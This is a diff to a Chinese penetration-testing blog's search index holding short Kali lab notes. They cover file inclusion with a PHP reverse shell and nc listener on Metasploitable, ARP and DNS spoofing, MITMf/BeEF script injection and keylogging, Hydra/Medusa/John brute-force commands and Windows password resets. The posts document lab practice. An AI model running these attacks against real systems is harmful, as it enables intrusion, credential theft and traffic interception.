@@ -1,27 +1,58 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[文件遍历漏洞]]></title>
+    <url>%2F2019%2F04%2F25%2F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[环境搭建测试机ip：192.168.86.135靶机metasploittable的ip:192.168.86.128靶机编辑php.ini文件 sudo vim /etc/php5/cgi/php.ini //编辑php配置文件 找到allow_url_include这一行把Off改成On， sudo /etc/init.d/apache2 restart //重启apache服务 发起攻击 尝试文件/etc/passwd遍历查看，成功。 尝试定位url链接，成功 测试机开启apache服务，制作php反弹shell，使其定位其链接http://192.168.86.135/1.php`cp /url/share/webshells/php/php-reverse-shell.php /var/www/html/1.php //复制成1.php到web目录下vim 1.php //修改127.0.0.1成测试机ip完成保存service apache2 start //开启apache服务nc -nvvlp 1234 //nc开启监控端口 `]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>web渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[mitmf使用实行中间人xss攻击]]></title>
+    <url>%2F2019%2F04%2F25%2Fmitmf%E4%BD%BF%E7%94%A8%E5%AE%9E%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BAxss%E6%94%BB%E5%87%BB%2F</url>
+    <content type="text"><![CDATA[下载mitmfapt-get install mitmfkali2.0以上默认没有mitmf软件，kali1.0有mitmif。blackarch集成mitmf，推荐使用。 mitmf实行xss攻击启动beefcd /usr/share.beef/目录下，./beef启动beef默认账号密码都为beef使用arp欺骗，插入js脚本，实现xss攻击可以看到网页源码已经插入js脚本了 mitmf键盘记录器mitmf网页图片倒置（恶作剧） mitmf cookie显示]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>密码破解</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[dnschefDNS欺骗]]></title>
     <url>%2F2019%2F04%2F24%2FDNS%E6%AC%BA%E9%AA%97%2F</url>
     <content type="text"><![CDATA[dnschef –fakeip=192.168.200.2 –fakedomains=www.baidu.com,www.qq.com –interface 192.168.200.243 -qfackip欺骗到指定的ip，facedomains欺骗域名window修改dns服务器]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>中间人攻击</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[使用john破解密码]]></title>
     <url>%2F2019%2F04%2F24%2Fjohn%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81%2F</url>
     <content type="text"><![CDATA[john Created directory: /root/.john John the Ripper password cracker, version 1.8.0.6-jumbo-1-bleeding [linux-x86-64-avx] Copyright (c) 1996-2015 by Solar Designer and others Homepage: http://www.openwall.com/john/ Usage: john [OPTIONS] [PASSWORD-FILES] --single[=SECTION] &quot;single crack&quot; mode --wordlist[=FILE] --stdin wordlist mode, read words from FILE or stdin --pipe like --stdin, but bulk reads, and allows rules --loopback[=FILE] like --wordlist, but fetch words from a .pot file --dupe-suppression suppress all dupes in wordlist (and force preload) --prince[=FILE] PRINCE mode, read words from FILE --encoding=NAME input encoding (eg. UTF-8, ISO-8859-1). See also doc/ENCODING and --list=hidden-options. --rules[=SECTION] enable word mangling rules for wordlist modes --incremental[=MODE] &quot;incremental&quot; mode [using section MODE] --mask=MASK mask mode using MASK --markov[=OPTIONS] &quot;Markov&quot; mode (see doc/MARKOV) --external=MODE external mode or word filter --stdout[=LENGTH] just output candidate passwords [cut at LENGTH] --restore[=NAME] restore an interrupted session [called NAME] --session=NAME give a new session the NAME --status[=NAME] print status of a session [called NAME] --make-charset=FILE make a charset file. It will be overwritten --show[=LEFT] show cracked passwords [if =LEFT, then uncracked] --test[=TIME] run tests and benchmarks for TIME seconds each --users=[-]LOGIN|UID[,..] [do not] load this (these) user(s) only --groups=[-]GID[,..] load users [not] of this (these) group(s) only --shells=[-]SHELL[,..] load users with[out] this (these) shell(s) only --salts=[-]COUNT[:MAX] load salts with[out] COUNT [to MAX] hashes --save-memory=LEVEL enable memory saving, at LEVEL 1..3 --node=MIN[-MAX]/TOTAL this node&#39;s number range out of TOTAL count --fork=N fork N processes --pot=NAME pot file to use --list=WHAT list capabilities, see --list=help or doc/OPTIONS --format=NAME force hash of type NAME. The supported formats can be seen with --list=formats and --list=subformats 破解linux密码显示已完成破解的密码文件john破解缓存文件夹 john破解windows密码显示破解的密码 john的图形化界面——johnnyjohnny破解linux密码]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>密码破解</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[arp攻击]]></title>
     <url>%2F2019%2F04%2F24%2Farp%E6%94%BB%E5%87%BB%2F</url>
     <content type="text"><![CDATA[arpspoof -h Version: 2.4 Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host aspspoof -t 被攻击ip -r 网关ip然后可以看到winows主机的arp表的变化这时所有的windows通过网关都会转到kali上，所以被攻击无网络服务了。kali开启路由转发，echo 1 &gt; /proc/sys/net/ipv4/ip_forward此时windows就可以上网了，但是所有的流量都经过kali进行转发。利用kali网卡wireshark进行抓包driftnet抓取目标机数据图片创建arotemp目录存放数据图片音频信息，driftnet -i eth0 -a -d arptemp -s-i 选择接口 -a 数据存放目录 -d 指定目录-s 抓取音频仅支持MOEG获取目标浏览url信息urlsnarf -i eth0dsniff 对目标密码进行捕获，]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>中间人攻击</tag>
       </tags>
   </entry>
   <entry>
@@ -36,54 +67,75 @@
     <title><![CDATA[hash_identifier和Hashid猜测识别加密算法]]></title>
     <url>%2F2019%2F03%2F29%2Fhash_identifier%E5%92%8CHashid%E7%8C%9C%E6%B5%8B%E8%AF%86%E5%88%AB%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%2F</url>
     <content type="text"><![CDATA[1.hash-identifier2.hashid]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>密码破解</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[使用medusa破解密码]]></title>
     <url>%2F2019%2F03%2F29%2F%E4%BD%BF%E7%94%A8medusa%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81%2F</url>
     <content type="text"><![CDATA[medusa -h查看帮助 主要参数： -h 目标域名或ip-H 包含ip后域名的文件-u 用户名测试-U 包含要测试的用户名的文件-p 密码测试-P 包含要测试的密码的文件-e[n/s/ns] 添加其他密码检查条件 (无密码,密码 = 用户名)-M 要执行的模块的名称 (不包括. mod 扩展)-d 输出所有模块-n 用于非默认 TCP 端口号-s 启用ssl medusa -d 输出所有模块 medusa破解ftp 靶机开启ftp服务，攻击机进行破解medusa -u root -P comon.lst -h 192.168.200.243 -M ftp medusa破解mysqlmedusa -u root -P comon.lst -h 192.168.200.244 -e ns -M mysql mysql无密码 medusa破解sshmedusa -u root -P comon.lst -h 192.168.200.244 -e ns -M ssh]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>密码破解</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[pw-inspector筛选字典内容]]></title>
     <url>%2F2019%2F03%2F29%2Fpw-inspector%E7%AD%9B%E9%80%89%E5%AD%97%E5%85%B8%E5%86%85%E5%AE%B9%2F</url>
     <content type="text"><![CDATA[pw-inspector -h查看帮助 -i 输入文件-o 输出文件-m 有效密码的最小长度-M 有效密码的最大长度-l 小写字母-u 大学字母-p 可打印的字符 -s 特殊字符-n 数字 pw-inspector -i pass.lst -o up.lst -l筛选pass.lst字典小写字符输出为lp.lst(包含一个小写字母也算) pw-inspector -i pass.lst -o up.lst -l u筛选pass.lst字典小写字符输出为up.lst(包含一个大写字母也算)]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>密码破解</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[使用hydra破解密码]]></title>
     <url>%2F2019%2F03%2F29%2F%E4%BD%BF%E7%94%A8hydra%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81%2F</url>
     <content type="text"><![CDATA[1.windows密码破解 smb密码破解设置windows账号密码，linux的ssh登陆密码破解hydra破解ftp登陆账号密码hydra破解表单密码，这里是我是dvwa页面破解。密码破解的特征是密码正确会跳转到index.php页面。使用post方式提交密码。hydra -l admin -P comon.lst 192.168.200.244 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:S=index.php&quot; -Vxhydra是hydra的图形界面]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>密码破解</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[crunch创建密码字典]]></title>
     <url>%2F2019%2F03%2F18%2Fcrunch%E5%88%9B%E5%BB%BA%E5%AF%86%E7%A0%81%2F</url>
     <content type="text"><![CDATA[crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options] – &lt;charset string&gt;默认是小写字符 crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100 – -b 按大小分割字典文件（kb/kib、mb/mib、gb/gib） – -c 每个字典的行数 – 以上两个参数必须与-o START 结合使用 – -d 同一字符连贯出现数量（11 / aaa) /usr/share/crunch/charset.lst crunch 内置字符文件 使用crunch 内置字符文件字符集hex-lower创建字典 crunch 1 1 -p 1234567890 | more -p参数指定字符串对对其所有排序组合列车，此命令意思是对1234567890列出这10个数字所有排列组合。其前面的指定密码长度无效 字典组成规则 – crunch 6 6 -t @,%%^^ | more– @：小写字母 lalpha –— ,：大写字母 ualpha– %:数字 numeric– ^:符号 symbols 输出文件压缩 – crunch 4 4 -t @,%^ -o 1.txt -z 7z –其他压缩格式：gzip、bzip2、lzma – 7z压缩比率最大]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>密码破解</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[nmap扫描]]></title>
     <url>%2F2019%2F03%2F11%2Fnmap%E6%89%AB%E6%8F%8F%2F</url>
     <content type="text"><![CDATA[nmap是一款开源免费的网络发现和安全审计工具，扫描端口、操作系统的版本、端口对应运行的服务等等。zenmap是nmap官方提供的图形界面工具 nmap XXX.XXX.XXX.XXX 完整扫描 nmap -v XXX.XXX.XXX.XXX 打印每一步扫描 nmap -f XXX.XXX.XXX.XXX 扫描常见的端口 nmap -sV XXX.XXX.XXX.XXX 检测服务详细信息 nmap -O XXX.XXX.XXX.XXX 检测主机操作系统以及硬件信息 nmap –script=vuln XXX.XXX.XXX.XXX 扫描目标系统漏洞 namp -sT xxx.xxx.xxx.xxx TCP扫描，这种扫描可能会被目标机系统日志记录 namp -sS tcp syn（半扫描）扫描，一般不会被目标机系统日志记录 namp -sU udp扫描，但是一般不可靠 nmap -v（显示每一条信息） -sn （扫描存活主机，不扫描端口）-PE（通过PE确定机器是否开启） XXX.XXX.XXX.1/24 扫描整个子网 nmap -v -sn -PE XXX.XXX.XXX.1-5指定范围扫描 nmap -v -p 135 XXX.XXX.XXX.XXX扫描指定135端口（多个端口逗号分隔） nmap -sS XXX.XXX.XXX.XXX SYN扫描，隐蔽扫描（不需要创建完整链接）端口：默认情况下，nmap会扫描1000个最有可能开放的tcp端口 namp默认（局域网）扫描 扫描系统信息 扫描系统漏洞 局域网扫描 指定端口扫描，如果未指定端口默认1-1000]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[linux搭建DNS服务器]]></title>
     <url>%2F2019%2F03%2F08%2Flinux%E6%90%AD%E5%BB%BADNS%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
     <content type="text"><![CDATA[一.远程登陆&amp;配置yum源下载xshell 安装打开,输入虚拟机ip地址,默认端口号22,然后填账号(root),密码,登陆成功. 配置yum源cd /etc/yum.repos.d/ //进入/etc/repo目录 vim web163.repo //新建yum源文件 配置的网易的yum源(可粘贴复制)32位的系统选这个 [wed163] name=wed baseurl=https://mirrors.163.com/centos/6/os/i386/ mediaid=1384196515.415715 metadata_expire=-1 gpgcheck=1 cost=500 enabled=1 gpgkey=https://mirrors.163.com/centos/6/os/i386/RPM-GPG -KEY-CentOS-6 64位系统选这个 [wed163] name=wed baseurl=https://mirrors.163.com/centos/6/os/x86_64/ mediaid=1384196515.415715 metadata_expire=-1 gpgcheck=1 cost=500 enabled=1 gpgkey=https://mirrors.163.com/centos/6/os/x86_64/RPM-GPG-KEY-CentOS-6 保存退出,下面清理yum缓存且进行测试 clean yum all //清除缓存 clean yum makecache //重新下载缓存 yum repolist //查看yum安装包数量 安装dns,配置dns安装dns,安装成功即可进行下一步yum install bind -y //安装dns(即bind),-y确认 rpm -qa|grep bind //查看bind是否安装成功有bind的相关 配置dns配置主配置文件 named.confcd /etc/ ls named* //查看named相关配置文件 可ka看到named.conf即dns主配置文件 vim /etc/named.conf //编辑主配置文件 如下图所示,进行部分修改,把这三项修改就保存退出 配置正向解析区域vim /etc/named.rfc1912.zones 进行添加解析,修改如图所示.在下面的第二图中,我添加的是”jaie32.com”,这里可以修改成你自己喜欢的域名 ####配置正向区域数据库文件 cd /var/named/ //进入配置目录 ls //查看目录文件 cp -p named.empty jaie32.com.zone //完成复制named.empty文件命名jaie32.com vim jaie32.com.zone //编辑文件,并进行一些修改改如下图所示,完成保持退出 这里的IP地址是自己主机地址,使用ifconfig命令可查看 ###修改主机dns服务器位自己的ip vim /etc/resolv.conf //打开之后修改如下图所示 ####到这里配置基本完成了,下面重启服务 service named restart //重启dns服务 测试dns方法一:ping自己域名(推荐,简单方便)ping www.jaie32.com //可以看到自己的ip,ping通即成功 方法二:nslookup命令nslookup //输入nslookup,然后输入自己的域名如图所示 方法三:dig命令测试dig www.jaie32.com //dig 域名 安装web服务器测试yum install httpd -y //安装web服务器包 service httpd start //启动web服务 然后再打开虚拟机服务器,打开浏览器,输入域名.结果如图所示]]></content>
+      <categories>
+        <category>linux</category>
+      </categories>
       <tags>
         <tag>linux</tag>
       </tags>
@@ -92,24 +144,33 @@
     <title><![CDATA[kali破解密码，pe破解密码]]></title>
     <url>%2F2019%2F03%2F08%2Fwindows%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%2F</url>
     <content type="text"><![CDATA[kali破解windows密码1.镜像u盘启动（这里用虚拟机模拟） windows增加test用户设置密码，iso镜像：kali 2.BOIS启动，在bois引导中把cd/rom方式置顶。F10保持退出，进入kali安装界面显示，选第一，进入kali。 挂载WINDOW的c盘，破解密码 fdilk -l查看磁盘!并挂载C盘 使用samdump2合并导出SAM和system数据，cat数据内容，jonh破解密码删除windows密码 chntpw修改SAM!这里选1编辑密码选择修改用对应的ID选择1清除密码成功后选q退出，再选y选择保存 重启入bois选择硬盘引导，进入windows选择test用户会发现无需密码登陆了。 利用pe修改密码 创建一个或多个用户，u盘制作pe，（这里使用微pe软件），虚拟机在设置中添加磁盘代理u盘。在bois中把scsi设为第一引导，然后F10保存退出 在pe中选择windows密码修改软件（NTPWEdit）修改密码，然后把bois引导调回磁盘引导开机，可以发现windows用户密码已修改。]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>密码破解</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[安装双系统kali和window10的几个坑点]]></title>
     <url>%2F2019%2F03%2F08%2F%E5%AE%89%E8%A3%85%E5%8F%8C%E7%B3%BB%E7%BB%9Fkali%E5%92%8Cwindow10%E7%9A%84%E5%87%A0%E4%B8%AA%E5%9D%91%E7%82%B9%2F</url>
     <content type="text"><![CDATA[1.制作kaliu盘启动盘的软件选择我一开始是选择软碟通，制作完成，开机安装kali时，却说找不到u盘。百度google查找下，说是拔出u盘重试，或换个u盘接口，我试了不下10遍，完全没有用。再然后换了个制作U盘的软件rufus，尝试下也不行，然后换了个制作软件u盘软件win32diskimager，发现成功，可以探寻到u盘了，至于为什么只有win32diskimager可以，而软碟通和rufus不可以，我也是很不解的，好像kali官方推荐也是win32diskimager，而且有很多教程用软碟通和rufus却可以，也有很多人不可以，还是推荐用win32diskimager比较省心吧， 2.检测不到固态硬盘我的固电脑是全固态的，在安装检测分区时，检测不到我的固态硬盘，却可以检测我的u盘出来，我一开始是怀疑分区表的问题，我的固态分区表是GUID，U盘是MBR，能不成要转换成GUID，可是一转换，windows系统可能要崩。我插上我的移动硬盘（MBR）也可以检测到，问题就出在固态上，我看网上说可能是磁盘类型是动态磁盘，要调为基本磁盘才可行，但是我的磁盘本来就是基本磁盘，所以排除这个想法。另一个是bios中磁盘模式，要改一下，我就进我bios，但是没有发现有磁盘模式这个选择，难受。在来通过了解，发现是bios是初始版本，没有这个选项，我就上联想官网下载bios下载更新驱动，然后更新驱动就有磁盘模式的选项，我还是第一次更新bios驱动，然后磁盘模式有RAID和AHCI两种模式可选，默认是RAID的，我选AHCI，kali安装分区可以检测我的固态硬盘了，一路安装下去很顺利，kali安装完成可以开机，但当我选windows开机时发现开不起机，然后bios把磁盘模式调回RAID模式时，windows可以开机了，但kali却开不起机，也就是说]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>环境搭建</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[theharvester的使用]]></title>
     <url>%2F2019%2F03%2F06%2Ftheharvester%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
     <content type="text"><![CDATA[TheHarvester能够收集电子邮件账号、用户名、主机名和子域名等信息。它通过Google、Bing、PGP、LinkedIn、Baidu、Yandex、People123、Jigsaw、Shodan等公开资源整理收集这些信息。这些信息将在后期的渗透测试阶段发挥巨大的作用。 d 参数制定目标域 -l 参数制定数量 -b 参数指定接口 -s 制定起始数值theharvester -d qq.com -l 200 -b baidu theharvester -d 163.com -b baidu]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
       <tags>
-        <tag>渗透测试</tag>
+        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
